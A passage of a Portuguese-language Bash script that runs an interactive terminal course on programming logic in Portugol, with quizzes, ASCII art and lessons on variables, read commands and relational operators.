E em lógica de programação basicamente você vai aprender a criar algoritmos.\033[0m"
		echo
		echo -e "\033[1;33mESCOLHA A OPÇÃO CORRETA:[1/2/3] \033[0m"
		read RESP_UM
		clear
		#Verificando se acertou a resposta
		if [ "$RESP_UM" -eq 3 ];then
		   RESP_UM_OFC="sim"
		else
		   RESP_UM_OFC="não"
		fi

		echo -e '\033[1;34m
	╭╭━━╮╮┈┈┈╭┓╭┓┈┈┈
	┊┃╭━╯╯┈┈┈┃┗┛┗╮┈┈
	┈┃┃╭━━━━━┫╭▋▋┃┈┈
	┈┃╰┫━╮╱╱╱╱╱╱▼┃┈┈
	┈╰━┫╱┗━╮╱━╮╰┻┣╮┈
	┈┈┈╰━━━┻━━┻━━┻┛┈
\033[0m\033[1;31m
    CONTINUE RESPONDENDO... AINDA
    FALTA DUAS PERGUNTAS!\033[0m'
		sleep 5;clear
		echo -e "\033[1;31m2) O que é um algoritmo?\033[0m"
		echo
		echo -e "\033[1;32m[\033[0m1\033[1;32m]\033[0m\033[1;34m É um passo a passo para se resolver um problema. Sendo que existe apenas uma forma de resolver um problema. \033[0m"
		echo
		echo -e "\033[1;32m[\033[0m2\033[1;32m]\033[0m\033[1;34m É um passo a passo para se resolver um problema. Sendo que um problema em si existem várias formas de serem resolvido. \033[0m"
		echo
		echo -e "\033[1;32m[\033[0m3\033[1;32m]\033[0m\033[1;34m É a solução para o problema. \033[0m"
		echo
		echo -e "\033[1;33mESCOLHA A OPÇÃO CORRETA:[1/2/3] \033[0m"
		read RESP_DOIS
		clear

		#Verificando se acertou a resposta
		if [ "$RESP_DOIS" -eq 2 ];then
		   RESP_DOIS_OFC="sim"
		else
		   RESP_DOIS_OFC="não"
		fi

		echo -e '\033[1;34m
	┈┈┈╱▔▔▔╲
	▇▔▔┈▍▍┃┈┃╭━╮
	╲━━╯┈┈┃┈┃╰╮┃
	┈▔▔▔┃┈╰━╯╲┃┃
	┈┈┈┈┃┃┃┈┈▕┃┃
	┈┈┈┈┃┃┃╭┛▕╯┃
	┈┈┈┈┗┻┛┗━╯━╯
\033[0m\033[1;31m
    Opa, Falta Apenas Uma
    Pergunta!\033[0m '
		sleep 4;clear
		echo
		echo -e "\033[1;31m3) Quais são os operadores relacionais?\033[0m"
		echo
		echo -e "\033[1;32m[\033[0m1\033[1;32m]\033[0m\033[1;34m Os operadores Relacionais são: +, >, <> etc... \033[0m"
		echo
		echo -e "\033[1;32m[\033[0m2\033[1;32m]\033[0m\033[1;34m São: + , - , ^ , * etc... \033[0m "
		echo
		echo -e "\033[1;32m[\033[0m3\033[1;32m]\033[0m\033[1;34m São: > , < , <> , >= etc... \033[0m"
		echo
		echo -e "\033[1;33mESCOLHA A OPÇÃO CORRETA:[1/2/3] \033[0m"
		read RESP_TRES
		clear

		#Verificando se acertou a resposta
		if [ "$RESP_TRES" -eq 3 ];then
		   RESP_TRES_OFC="sim"
		else
		   RESP_TRES_OFC="não"
		fi


		echo -e '\033[1;34m
        ┈┈┈╱▔▔▔╲
        ▇▔▔┈▍▍┃┈┃╭━╮
        ╲━━╯┈┈┃┈┃╰╮┃
        ┈▔▔▔┃┈╰━╯╲┃┃
        ┈┈┈┈┃┃┃┈┈▕┃┃
        ┈┈┈┈┃┃┃╭┛▕╯┃
        ┈┈┈┈┗┻┛┗━╯━╯
\033[0m\033[1;31m
   Obrigado Por Responder
   Tudo. Espera só um Seg
   que eu irei Corrigir a
   Prova e Logo...Logo te
   Direi o Resultado!\033[0m '

		sleep 7;clear
		echo -e "
                 \033[1;36m=-=-=-=-=-=-=
                 =\033[0m\033[1;33m RESULTADO\033[0m\033[1;36m =
                 =-=-=-=-=-=-=\033[0m

\033[1;34mVOCÊ ACERTOU A PRIMEIRA QUESTÃO ?\033[0m $RESP_UM_OFC

\033[1;34mVOCÊ ACERTOU A SEGUNDA QUESTÃO ?\033[0m $RESP_DOIS_OFC

\033[1;34mVOCÊ ACERTOU A TERCEIRA QUESTÃO ?\033[0m $RESP_TRES_OFC
"
		echo -e '
             \033[1;36m =-=-=-=-=-=-=-=-=-=-=-=
              =\033[0m\033[1;33m RESPOSTAS CORRETAS:\033[0m\033[1;36m =
              =-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33m1) O QUE É LÓGICA DE PROGRAMAÇÃO ?
R=\033[0m \033[1;31mÉ uma matéria, Cujo o intuito é melhorar a sua lógica na programação, Usando as ferramentas: Portugol, Diagrama de blocos etc...

E em lógica de programação basicamente você vai aprender a criar algoritmos. \033[0m

\033[1;33m2) O QUE É UM ALGORITMO ?
R=\033[0m \033[1;31mÉ um passo a passo para se resolver um problema. Sendo que um problema em si existem várias formas de serem resolvido. \033[0m

\033[1;33m3) QUAIS SÃO OS OPERADORES RELACIONAIS ?
R=\033[0m \033[1;31mSão: > , <> , >= ,<= etc... \033[0m

'
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		read SEGUE;;
             19)
              #COMANDO DE LEITURA
                echo -e '\033[1;34m
                ┈┈┈╱▔▔▔╲
                ▇▔▔┈▍▍┃┈┃╭━╮
                ╲━━╯┈┈┃┈┃╰╮┃
                ┈▔▔▔┃┈╰━╯╲┃┃
                ┈┈┈┈┃┃┃┈┈▕┃┃
                ┈┈┈┈┃┃┃╭┛▕╯┃
                ┈┈┈┈┗┻┛┗━╯━╯
\033[0m
       \033[1;31mBEM VINDO A MAIS UMA AULA DO SEU CURSO
       DE INTRODUÇÃO A LÓGICA DE PROGRAMAÇÃO
       EM PORTUGOL. \033[0m'
		sleep 6;clear
		echo -e '\033[1;34m
                ┈┈┈╱▔▔▔╲
                ▇▔▔┈▍▍┃┈┃╭━╮
                ╲━━╯┈┈┃┈┃╰╮┃
                ┈▔▔▔┃┈╰━╯╲┃┃
                ┈┈┈┈┃┃┃┈┈▕┃┃
                ┈┈┈┈┃┃┃╭┛▕╯┃
                ┈┈┈┈┗┻┛┗━╯━╯
\033[0m
       \033[1;31mHOJE O NOSSO ASSUNTO É VARIÁVEIS E CONSTANTES...
       E UM POUCO SOBRE COMANDOS DE LEITURA. \033[0m '
		sleep 8;clear
		echo -e '\033[1;34m
                ┈┈┈╱▔▔▔╲
                ▇▔▔┈▍▍┃┈┃╭━╮
                ╲━━╯┈┈┃┈┃╰╮┃
                ┈▔▔▔┃┈╰━╯╲┃┃
                ┈┈┈┈┃┃┃┈┈▕┃┃
                ┈┈┈┈┃┃┃╭┛▕╯┃
                ┈┈┈┈┗┻┛┗━╯━╯
\033[0m \033[1;31m
      NA VERDADE ERA PRO ASSUNTO PRINCIPAL SER
      COMANDOS DE LEITURA, PORÉM TEMOS QUE EST-
      UDAR SOBRE VARIÁVEIS E CONSTANTES, PARA
      ASSIM APRENDER A UTILIZAR OS COMANDOS DE
      LEITURA. \033[0m '
		sleep 10;clear
		echo -e '\033[1;34m
              ╭━┳━╭━╭━╮╮
              ┃     ┣▅╋▅┫┃
              ┃   ┃   ╰━╰━━━━━━╮
              ╰┳╯          ◢▉◣
               ┃           ▉▉▉
               ┃           ◥▉◤
               ┃      ╭━┳━━━━╯
               ┣━━━━━━┫
              ╭╯　 　 ╰╮   \033[0m
\033[1;31m
       DAI SURGE A PERGUNTA! OQ É UM COMANDO DE
       LEITURA?

       BOM, SABE QUANDO VC TÁ NO MENU PRINCIPAL
       AQUI DA SCRIPT E TEM QUE DIGITAR UM NUMERO,
       PARA PODER ESCOLHER A OPÇÃO DESEJADA? \033[0m'
		echo
		echo -e "             \033[1;32m[\033[0m1\033[1;32m]\033[0m \033[1;31mSIM \033[0m     \033[1;32m[\033[0m2\033[1;32m]\033[0m \033[1;31mNÃO \033[0m"
		read AULA19_RESP1
		clear
		if [ "$AULA19_RESP1" -eq 1 ];then
		      echo -e '\033[1;34m
              ╭━┳━╭━╭━╮╮
              ┃     ┣▅╋▅┫┃
              ┃   ┃   ╰━╰━━━━━━╮
              ╰┳╯          ◢▉◣
               ┃           ▉▉▉
               ┃           ◥▉◤
               ┃      ╭━┳━━━━╯
               ┣━━━━━━┫
              ╭╯　 　 ╰╮   \033[0m
\033[1;31m
    Então, Automaticamente quando vc digita um número...
    esse número é atribuido a uma variável !!! \033[0m'
		else
		   if [ "$AULA19_RESP1" -eq 2 ];then
		      echo -e '\033[1;34m
                ┈┈┈╱▔▔▔╲
                ▇▔▔┈▍▍┃┈┃╭━╮
                ╲━━╯┈┈┃┈┃╰╮┃
                ┈▔▔▔┃┈╰━╯╲┃┃
                ┈┈┈┈┃┃┃┈┈▕┃┃
                ┈┈┈┈┃┃┃╭┛▕╯┃
                ┈┈┈┈┗┻┛┗━╯━╯
\033[0m \033[1;31m
	JÁ QUE VOCÊ NÃO ENTEDEU, EU VOU
        USAR O TERMUX COMO EXEMPLO. \033[0m '
		      sleep 5;clear
		      echo -e '\033[1;34m
                ┈┈┈╱▔▔▔╲
                ▇▔▔┈▍▍┃┈┃╭━╮
                ╲━━╯┈┈┃┈┃╰╮┃
                ┈▔▔▔┃┈╰━╯╲┃┃
                ┈┈┈┈┃┃┃┈┈▕┃┃
                ┈┈┈┈┃┃┃╭┛▕╯┃
                ┈┈┈┈┗┻┛┗━╯━╯
\033[0m \033[1;31m
	ENTÃO VAMOS LÁ, ESCOLHA UM
        NÚMERO ENTRE 0 A 100: \033[0m '
		      read AULA19_RESP2
		      clear
		      echo -e "\033[1;34m
	╥━━━━━━━━╭━━╮━━┳
	╢╭╮╭━━━━━┫┃▋▋━▅┣
	╢┃╰┫┈┈┈┈┈┃┃┈┈╰┫┣
	╢╰━┫┈┈┈┈┈╰╯╰┳━╯┣
	╢┊┊┃┏┳┳━━┓┏┳┫┊┊┣
	╨━━┗┛┗┛━━┗┛┗┛━━┻ \033[0m
\033[1;31m
    Enfim, O número $AULA19_RESP2
    foi atribuído a uma variável
    chamada AULA19_RESP2, Ou seja
    A variável AULA19_RESP2 tem o
    valor $AULA19_RESP2 \033[0m"
		   fi
		fi

		echo
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		read SEGUE
		clear
		echo -e '\033[1;34m
	┊┊┊▕▔╲▂▂▂╱▔▏┊┊┊
	╭━━╮╭┈╮┈╭┈╮╭━━╮┈
	╰╰╰┃▏╭╮┈╭╮▕┃╯╯╯
	┈┃┈┃▏┈┈▅┈┈▕┃┈┃┈
	┈┃┈┃▏┈╰┻╯┈▕┃┈┃┈
	┈┃┈╰▅▅▅◇▅▅▅╯┈┃┈
	┈╰━━┓┈╭┻╮┈┏━━╯
\033[0m\033[1;31m
  OU SEJA, UM COMANDO DE LEITURA ...
  FAZ COM QUE A TELA PARE E O USUÁRIO
  TENHA QUE DIGITAR ALGO, E ESSE ALGO
  É ATRIBUÍDO A UMA VARIÁVEL.\033[0m'
		echo
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		read SEGUE
		clear
		echo -e '\033[1;34m
              ╭━┳━╭━╭━╮╮
              ┃     ┣▅╋▅┫┃
              ┃   ┃   ╰━╰━━━━━━╮
              ╰┳╯          ◢▉◣
               ┃           ▉▉▉
               ┃           ◥▉◤
               ┃      ╭━┳━━━━╯
               ┣━━━━━━┫
              ╭╯　 　 ╰╮   \033[0m
\033[1;31m
      O HELEXIEL MANDOU EU TE ENTREGAR
      ESSA APOSTILA/TEXTO, LOGO ABAIXO
      QUE ELE CRIOU PARA DAR CONTINUAÇÃO
      NA AULA DE HOJE.

      VALE DESTACAR QUE É PARA DAR ENTER
      APÓS VC LER TODO O TEXTO DUAS VEZES.\033[0m'
		echo
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		read SEGUE
		clear
		echo -e '
\033[1;36m=-=-=-=-=-=-=-=-=-=-=-=
=\033[0m\033[1;33mAPOSTILA DA AULA 19: \033[0m\033[1;36m=
=-=-=-=-=-=-=-=-=-=-=-=\033[0m

\033[1;33mESCOLA:\033[0m \033[1;31mUmbrella Corporation\033[0m
\033[1;33mDONO:\033[0m\033[1;31m Levi\033[0m
\033[1;33mPROFESSOR: \033[0m\033[1;31mHele_Strange\033[0m
\033[1;33mALUNO(A):\033[0m\033[1;31m Desconhecido\033[0m
\033[1;33mNÍVEL: \033[0m\033[1;31mGrupo de Estudo Básico\033[0m

\033[1;33m1) QUAL A DIFERENÇA ENTRE VARIÁVEIS E CONSTANTES:\033[0m

\033[1;34mUma variável é um espaço que o computador guarda para armazenar determinado dado. E esse dado ele pode ser mudado no decorrer do programa.

Uma constante tem quase o mesmo significado da palavra variável, Porém o seu valor não pode ser mudado durante o programa. 

Ou seja, Como o próprio nome diz "Constante", Algo que é constante no programa.\033[0m

\033[1;33m2) EXEMPLO DE ALGORITMO COM VARIÁVEIS:\033[0m

\033[1;34mBom, Como o Bot Speaker disse no início da aula.... Para aprender a utilizar o comando de leitura em Portugol... é necessário saber sobre variáveis e constantes.

Agora voltando ao assunto do título...


Segue abaixo um exemplo de algoritmo em Portugol com variáveis:\033[0m
\033[1;32m
Algoritmo "Calculadora"

//Isso Aqui é Um Comentário.

//Nome do programa: Calculadora.

//Logo Abaixo Estamos Definindo as variáveis 

var num1,num2: inteiro

//Ou seja, Temos duas variáveis sendo num1 e num2 do tipo inteiro.

//Agora nós vamos pedir o valor do primeiro NÚMERO pro USUÁRIO.

escreval ("Digite o valor do Primeiro número: ")

//Comando de leitura abaixo!

leia (num1)

//Oq o USUÁRIO digitar vai ser armazenado na variável num1.

//Pedindo o segundo NÚMERO para somar.....

Escreva ("Muito Bem, Agora Digite o Segundo Valor: ")
leia (num2)

//Exibindo a Soma Das Duas Variáveis Pro Usuário.

Escreval ("A Soma de ",num1," + ",num2," é: ",num1+num2)

FimAlgoritmo
\033[0m
\033[1;34m
Enfim, Não tem muito oq explicar, já que eu estou explicando nas linhas de comentário sobre cada parte do programa.

Porém eu Gostaria de falar sobre a linha aonde eu estou definindo as variáveis do programa.

Que é:\033[0m
\033[1;32mvar num1,num2: inteiro\033[0m
\033[1;34m
A palavra "var" é um comando reservado do compilador, Sendo a palavra "var" uma espécie de simplificação da palavra variável.\033[0m

\033[1;33mAluno - O que é uma palavra reservada do compilador ?\033[0m

\033[1;33mHelexiel - Bom, É sinônimo de comando. Ou seja uma linguagem independente de ser de programação ou não, Funciona a base de comandos.... e em Portugol não é diferente.\033[0m

\033[1;34mMas continuando....

Depois de "var" temos "num1,num2".... e as palavras(Ou variáveis) estão separadas por virgula por causa que são variáveis. Ou seja cada variável na declaração é separada por virgula.\033[0m

\033[1;33mOu seja:\033[0m

\033[1;32mvar num1,num2:inteiro \033[0m

\033[1;33mEstá correto, Porém Já:\033[0m

\033[1;32mvar num1num2:inteiro\033[0m

\033[1;34mEstá incorreto! Assim o compilador vai interpretar que só é uma variável que estamos declarando. \033[0m

\033[1;34m
Enfim, e por último... temos ":" e a palavra "inteiro", Isso significa que as variáveis são do tipo inteiro(1,2,3,4,5,6 etc...).
\033[0m

\033[1;33m3) REGRAS PARA NOMEAÇÃO DE UMA VARIÁVEL:\033[0m
\033[1;34m
Para se declarar ou nomear uma variável... existem regras e caso você quebre qualquer uma delas, o Seu programa não irá funcionar!

As regras são as seguintes (Pelo que eu me lembre RS):

•Não pode ser uma palavra reservada do sistema;
•Não pode começar com números;
•Não pode  conter caracteres(Incluindo especiais);
•Não pode conter espaços em branco no nome de uma variável  (No máximo um underline ex: numero_Para_Somar1);\033[0m


\033[1;33m4) COMO NOMEAR UMA VARIÁVEL ?\033[0m

\033[1;34mÉ simples, Caso seja só uma variável, então é assim:\033[0m

\033[1;32m"var NOME_DA_VARIAVEL: TIPO DA VARIÁVEL"\033[0m

\033[1;34mAgora caso vc precise declarar mais de uma variável, Então vc tem que separar por vírgula.\033[0m

\033[1;34mExemplo:\033[0m

\033[1;32m"var NOME_DA_VAR,OUTRA_VAR: TIPO DA VARIÁVEL"\033[0m

\033[1;34mVale destacar que o nome de uma variável além de seguir as regras de nomeação... Precisa ter um nome pequeno.... e que o usuário saiba pra que serve apenas lendo o nome da mesma.
\033[0m
\033[1;33mALUNO - QUAIS SÃO OS TIPOS DE VARIÁVEIS ?\033[0m
\033[1;34m
Uma das regras em Portugol é sobre os tipos de variáveis. Que são:

•Inteiro;
•Real;
•Caracter;
•Logico;

E caso você precise fazer um programa, Tem que saber que após a definição, A variável só pode receber o tipo de dados atribuído, Caso contrário, Ocorrerá um erro.\033[0m

\033[1;33mE pequeno infectado! Saiba que isso não é um Bixo de sete cabeças. Segue abaixo a explicação:\033[0m
\033[1;34m
Imagine que Joãozinho precise criar um programa... e esse programa é para roubar pobres, É um programa de zoeira é tals.

É basicamente assim, O programa começa com a seguinte mensagem: "Mas senhor eu só tenho 50 reais, Pois esse mês eu não recebir o meu salário na fábrica".

E depois é imprimido essa outra mensagem: "Digite o quanto vc deseja tirar do pobre, OBS: Entre 0 a 50".

E logo após do usuário digitar o número é imprimido a mensagem: "Cara você me tirou ... e eu só fiquei com ... ! :("

E depois disso, o programa é encerrado!

Então, Para criar esse programa, Se você pensou bem e entedeu, Então vc descobriu que a gente precisa apenas de duas variáveis do tipo inteiro.

Ou seja, A linha da declaração de variáveis ficou assim: \033[0m

\033[1;32mVar VALOR_A_SER_TIRADO,DINHEIRO_DO_POBRE: inteiro\033[0m

\033[1;34m
E o programa todo ficou assim:\033[0m
\033[1;32m
Algoritmo "Roubando Pobres"
Var VALOR_A_SER_TIRADO,DINHEIRO_DO_POBRE: inteiro

DINHEIRO_DO_POBRE <- 50

escreval ("Mas senhor eu só tenho 50 reais, Pois esse mês eu não recebir o meu salário na fábrica")

escreval ("
Digite o quanto você deseja tirar do pobre, Obs: Entre 0 a 50")

Esperar 5.5 segundos

leia (VALOR_A_SER_TIRADO)

DINHEIRO_DO_POBRE <- DINHEIRO_DO_POBRE - VALOR_A_SER_TIRADO

Esperar 5.5 segundos
limpatela

Escreval ("Cara, Você me tirou ",VALOR_A_SER_TIRADO," e eu só fiquei com ",DINHEIRO_DO_POBRE," ! :(")

fimalgoritmo 
\033[0m

\033[1;33mObs:\033[0m\033[1;34m Copie e cole isso no seu App pseudocode e aperte em reproduzir.\033[0m
'
		echo
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		read SEGUE
		clear
		echo -e '\033[1;34m
              ╭━┳━╭━╭━╮╮
              ┃     ┣▅╋▅┫┃
              ┃   ┃   ╰━╰━━━━━━╮
              ╰┳╯          ◢▉◣
               ┃           ▉▉▉
               ┃           ◥▉◤
               ┃      ╭━┳━━━━╯
               ┣━━━━━━┫
              ╭╯　 　 ╰╮   \033[0m
\033[1;31m
    MUITO BOM, AGORA NÓS VAMOS PARA UM EXERCÍCIO
    COM O NOME "NOMEANDO UMA VARIÁVEL", MAS Ñ SE
    PREOCUPE POIS É MUITO FÁCIL!!! \033[0m'
		echo
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		read SEGUE;clear
		echo -e '
\033[1;36m=-=-=-=-=-=
=\033[0m\033[1;33mEXERCÍCIO\033[0m\033[1;36m=
=-=-=-=-=-=\033[0m
\033[1;34m
Bom, Nós temos que criar a linha de declaração de variáveis, Até agora o problema é dizer qual o tipo de variável. Enfim, Até agora a linha está assim: "Var MENU:", Pois a variável com o nome MENU é logicamente um MENU , E ESSE MENU de múltipla escolha funciona com números inteiros. Ou seja o usuário só vai digitar números inteiros. \033[0m


\033[1;31mAgora escolha abaixo qual o tipo de variável:\033[0m

\033[1;32m[\033[0m1\033[1;32m]\033[0m\033[1;31m Var MENU: caracter\033[0m
\033[1;32m[\033[0m2\033[1;32m]\033[0m\033[1;31m Var MENU: inteiro\033[0m
\033[1;32m[\033[0m3\033[1;32m]\033[0m\033[1;31m Var MENU: real\033[0m
'
		read ATIV_DA_AULA19
		clear
		if [ "$ATIV_DA_AULA19" -eq 2 ];then
		    echo -e "
\033[1;34mVOCÊ ACERTOU!!! A RESPOSTA CORRETA É: \033[0m

\033[1;32mVAR MENU:INTEIRO \033[0m"
		else
		    echo -e "
\033[1;34mVOCÊ ERROU!!! A RESPOSTA CORRETA É: \033[0m

\033[1;32mVAR MENU: INTEIRO\033[0m"
		fi
		echo
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		read SEGUE
		clear
		echo -e '\033[1;34m
        ┊┊┊▕▔╲▂▂▂╱▔▏┊┊┊
        ╭━━╮╭┈╮┈╭┈╮╭━━╮┈
        ╰╰╰┃▏╭╮┈╭╮▕┃╯╯╯
        ┈┃┈┃▏┈┈▅┈┈▕┃┈┃┈
        ┈┃┈┃▏┈╰┻╯┈▕┃┈┃┈
        ┈┃┈╰▅▅▅◇▅▅▅╯┈┃┈
        ┈╰━━┓┈╭┻╮┈┏━━╯
\033[0m\033[1;31m
E por fim, Vamos estudar o comando de leitura em Portugol em si...

A sintaxe dele é simples, Veja logo abaixo:

leia (NOME_DA_VARIAVEL)

Acabo! Depois oq o usuário digitar vai ser atribuído a variável, que no caso está entre parênteses.
\033[0m'
		echo
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		read SEGUE
		clear
		echo -e '\033[1;34m
        ┊┊┊▕▔╲▂▂▂╱▔▏┊┊┊
        ╭━━╮╭┈╮┈╭┈╮╭━━╮┈
        ╰╰╰┃▏╭╮┈╭╮▕┃╯╯╯
        ┈┃┈┃▏┈┈▅┈┈▕┃┈┃┈
        ┈┃┈┃▏┈╰┻╯┈▕┃┈┃┈
        ┈┃┈╰▅▅▅◇▅▅▅╯┈┃┈
        ┈╰━━┓┈╭┻╮┈┏━━╯
\033[0m\033[1;31m
  E CHEGAMOS AO FINAL DE MAIS UMA AULA
  ESPERO QUE TENHA APRENDIDO TUDO! E
  GOSTADO, ATÉ A PRÓXIMA AULA!!!\033[0m'
		echo
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		read SEGUE;;
	20)
         #Criando um programa
                #Variavel aonde fica a resposta certa
		RESP_UM_DA_AULA20_OFC='escreval ("digite sua idade:")'


		while [[ "$RESP_UM_DA_AULA20" != $RESP_UM_DA_AULA20_OFC ]]
		do
			clear
        		unset RESP_UM_DA_AULA20
			echo -e '\033[1;31m
Na aula de hoje nós vamos criar um programa juntos, E praticamente eu só vou fazer umas perguntas e vc terá que responder corretamente.

O programa que nós vamos criar é para saber se o usuário é maior ou menor de idade (Bem clichê n?), Enfim e eu quero que no final vc copie e cole esse programa no seu App pseudocode para ver ele funcionando.\033[0m'
			echo
			echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
			read SEGUE
			clear
			echo -e '
\033[1;31mAté agora o programa está assim:
\033[0m \033[1;32m
------------------------------------

algoritmo "Menor de idade ou maior"
var IDADE: inteiro

------------------------------------ \033[0m

\033[1;31mEntão eu quero que vc digite o comando que imprima a seguinte mensagem na tela "digite sua idade:", obs: tudo em minúsculo.\033[0m
'
			read RESP_UM_DA_AULA20


			#Falar pro usuario se ele esta certo ou errado
			clear
			if [ "$RESP_UM_DA_AULA20" = 'escreval ("digite sua idade:")' ];then
				echo -e "\033[1;34mVC ACERTOU!!!!!!!! \033[0m"
        		else
        		        echo -e "\033[1;34mERROU, TENTE NOVAMENTE!\033[0m"
        		fi


        		echo
        		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
        		read SEGUE
		done
		clear
		unset RESP_UM_DA_AULA20
		#Var aonde fica a resposta certa
		RESP_DOIS_DA_AULA20_OFC='leia (IDADE)'



		while [[ "$RESP_DOIS_DA_AULA20" != $RESP_DOIS_DA_AULA20_OFC ]]
		do
		        clear
		        unset RESP_DOIS_DA_AULA20
			echo -e '
\033[1;32m------------------------------------

algoritmo "Menor de idade ou maior"
var IDADE: inteiro
escreval ("digite sua idade:")

------------------------------------ \033[0m

\033[1;31mMuito bem, Agora Digite o comando para ler a variável IDADE. ex: O comando para ler a variável NOME é "leia (NOME)"\033[0m'
			read RESP_DOIS_DA_AULA20
			clear


			if [ "$RESP_DOIS_DA_AULA20" = 'leia (IDADE)' ];then
		                echo -e "\033[1;34mVC ACERTOU!!!!!!!! \033[0m"
		        else
		                echo -e "\033[1;34mERROU, TENTE NOVAMENTE!\033[0m"
		        fi


			echo
		        echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		        read SEGUE
		done
		clear
		unset RESP_DOIS_DA_AULA20
		#Var aonde fica a resposta certa
		RESP_TRES_DA_AULA20_OFC='<'


		while [[ "$RESP_TRES_DA_AULA20" != $RESP_TRES_DA_AULA20_OFC ]]
		do
		        clear
		        unset RESP_TRES_DA_AULA20
			echo -e '

\033[1;31mOlá, Até agora o programa está assim:  \033[0m
\033[1;32m------------------------------------

algoritmo "Menor de idade ou maior"
var IDADE: inteiro
escreval ("digite sua idade:")
leia (IDADE)
se (IDADE 

------------------------------------ \033[0m

\033[1;31mDigite o operador relacional que significa "menor que": \033[0m'
			read RESP_TRES_DA_AULA20
			clear


			if [ "$RESP_TRES_DA_AULA20" = '<' ];then
		                echo -e "\033[1;34mVC ACERTOU!!!!!!!! \033[0m"
		        else
		                echo -e "\033[1;34mERROU, TENTE NOVAMENTE!\033[0m"
		        fi


		        echo
		        echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		        read SEGUE
		done
		clear
		unset RESP_TRES_DA_AULA20
		#Var aonde fica a resposta certa
		RESP_QUATRO_DA_AULA20_OFC='>'



		while [[ "$RESP_QUATRO_DA_AULA20" != $RESP_QUATRO_DA_AULA20_OFC ]]
		do
		        clear
		        unset RESP_QUATRO_DA_AULA20
		        echo -e '
\033[1;32m------------------------------------

algoritmo "Menor de idade ou maior"
var IDADE: inteiro
escreval ("digite sua idade:")
leia (IDADE)
se (IDADE < 18) entao
   escreval  ("Vc é menor de idade")
senao
  se (IDADE

------------------------------------ \033[0m

\033[1;31mDigite o operador relacional que representa o valor de "maior que":'
			read RESP_QUATRO_DA_AULA20
			clear



			if [ "$RESP_QUATRO_DA_AULA20" = '>' ];then
		                echo -e "\033[1;34mVC ACERTOU!!!!!!!! \033[0m"
		        else
		                echo -e "\033[1;34mERROU, TENTE NOVAMENTE!\033[0m"
		        fi


		        echo
		        echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		        read SEGUE
		done
		clear
		unset RESP_QUATRO_DA_AULA20




		echo -e '

\033[1;31mNo final o programa ficou assim:  \033[0m

\033[1;32m------------------------------------

algoritmo "Menor de idade ou maior"
var IDADE: inteiro
escreval ("digite sua idade:")
leia (IDADE)
se (IDADE < 18) entao
   escreval ("Vc é menor de idade")
senao
  se (IDADE > 18) entao
    Escreval ("vc é maior de idade")
   fimse
fimse
fimalgoritmo

------------------------------------ \033[0m

\033[1;31mAgora copie e cole o algoritmo no app pseudocode e veja a execução. Após fizer isso aperte enter para prosseguir. \033[0m'
		echo
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		read SEGUE
		clear
		echo -e "\033[1;31mA aula de hoje acabou... e como nós podermos ver não foi um bixo de sete cabeças criar um programa que diga se o usuário é maior ou menor de idade.

E não se esqueça de se manter motivado para terminar o seu curso de introdução a lógica de programação em portugol... pois estamos na etapa final do curso.
 \033[0m"
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		read SEGUE
		clear;;
             21)
              #Tirando duvidas
                echo -e '\033[1;34m
                ┈┈┈╱▔▔▔╲
                ▇▔▔┈▍▍┃┈┃╭━╮
                ╲━━╯┈┈┃┈┃╰╮┃
                ┈▔▔▔┃┈╰━╯╲┃┃
                ┈┈┈┈┃┃┃┈┈▕┃┃
                ┈┈┈┈┃┃┃╭┛▕╯┃
                ┈┈┈┈┗┻┛┗━╯━╯
\033[0m\033[1;31m
                 OLÁ HUMANO \033[0m'
		sleep 5;clear
		echo -e "\033[1;31m
Antes de começarmos a nossa aula.... Eu gostaria de falar de como eu robô speaker nascir, Eu nascir quando o helexiel viu que não tinha tempo pra ensinar lógica de programação para vários alunos, então ele resolveu criar uma inteligência artificial que ensinasse por ele.

E isso foi em 2018, E agora eu estou aqui ensinando lógica de programação em 2019.

\033[1;33mObs:\033[0m\033[1;31m Isso não vai cair na avaliação final!
  \033[0m"
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
		read SEGUE;clear
		echo -e '\033[1;34m
        ╭╭━━╮╮┈┈┈╭┓╭┓┈┈┈
        ┊┃╭━╯╯┈┈┈┃┗┛┗╮┈┈
        ┈┃┃╭━━━━━┫╭▋▋┃┈┈
        ┈┃╰┫━╮╱╱╱╱╱╱▼┃┈┈
        ┈╰━┫╱┗━╮╱━╮╰┻┣╮┈
        ┈┈┈╰━━━┻━━┻━━┻┛┈
\033[0m\033[1;31m
      OQ IMPORTA É QUE HOJE EU
      ESTOU AQUI PARA TIRAR AS
      SUAS DÚVIDAS \033[0m
'
		echo -e "\033[1;33mAPERTE ENTER PARA PROSSEGUIR:\033[0m"
                read SEGUE;clear
		unset RESP_DO_MENU_DE_TIRAR_DUVIDAS

		while [[ $RESP_DO_MENU_DE_TIRAR_DUVIDAS -ne 9 ]]
		do
		clear
			echo -e '
         \033[1;36m     <---------------->
                   | \033[0m\033[1;33mMENU\033[0m\033[1;36m |
              <----------------> \033[0m


\033[1;36m     /------------------------------------\
     l\033[0m \033[1;32m1\033[0m \033[1;36m-\033[0m \033[1;31malgoritmo\033[0m	\033[1;36m	          l
     l\033[0m \033[1;32m2\033[0m\033[1;36m -\033[0m \033[1;31mtipos de algoritmos\033[1;36m	          l
     l\033[0m \033[1;32m3\033[0m \033[1;36m-\033[0m \033[1;31mOq é uma variavel\033[0m\033[1;36m  	          l
